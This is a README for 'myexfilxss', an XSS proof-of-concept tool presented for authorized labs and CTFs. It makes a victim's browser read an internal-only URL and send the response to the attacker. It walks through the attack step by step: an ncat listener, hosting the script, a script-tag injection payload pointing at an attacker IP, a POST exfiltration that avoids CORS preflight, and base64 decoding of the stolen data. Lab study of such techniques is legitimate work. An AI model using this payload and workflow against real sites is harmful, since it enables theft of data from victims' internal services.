# myexfilxss

Minimal XSS exfiltration PoC: the victim's browser reads an internal-only URL and sends the whole response back to you in a **single POST** (base64).

Built for study on authorized labs (Hack The Box, CTF, your own environments). Based on the [TrustedSec](https://trustedsec.com) XSS data-exfil PoC, simplified: no chunking, no image requests, one request out.

Part of the [Hackita](https://hackita.it) offensive security project.

## How it works

1. Your XSS payload loads `myexfilxss.js` in the victim's browser.
2. The script sends a `GET` to an internal URL (reachable only from the victim's machine, e.g. `http://127.0.0.1:4566/`).
3. The response is read as raw bytes, encoded in base64 and sent to your listener with one `POST` (`Content-Type: text/plain`, so no CORS preflight).
4. You decode the body with `base64 -d`.

It works with any content type: html, json, js, php output, zip, exe, images. Nothing is corrupted because the response is never decoded as text.

## Setup

Edit two values in `myexfilxss.js`:

| What | Where | Example |
|------|-------|---------|
| Internal URL to read | `var uri` in `stealData()` | `http://127.0.0.1:8080/` |
| Your IP | `exfil.open("POST", ...)` | `http://10.10.14.212/exfil` |

## Usage

Listener (receives the exfiltrated data):

```bash
sudo ncat -klvnp 80
```

Host the script on a different port (80 is taken by the listener):

```bash
python3 -m http.server 8000
```

Load it through the XSS (for example in a header or field that gets rendered to another user):

```html
<script src="http://YOUR_IP:8000/myexfilxss.js"></script>
```

Decode what arrives (the base64 is the body, after the empty line of the POST request):

```bash
echo 'BASE64_BODY' | base64 -d > response.bin
```

Use the extension that matches the content (`.html`, `.json`, `.zip`, `.exe`...).

## Limitations

- You only get what the server returns: for a PHP page that is its output, not its source code.
- The internal service must answer a plain `GET` without extra headers or authentication.
- Mixed content and CSP on the victim's page can block the request.

## Learn more

- [Blind XSS](https://hackita.it/articoli/blind-xss/)
- [SSRF](https://hackita.it/articoli/ssrf/)
- [Hackita.it](https://hackita.it)

## Legal

For educational use and authorized testing only. Do not use it against systems you do not own or do not have written permission to test. The author is not responsible for misuse.

## License

MIT
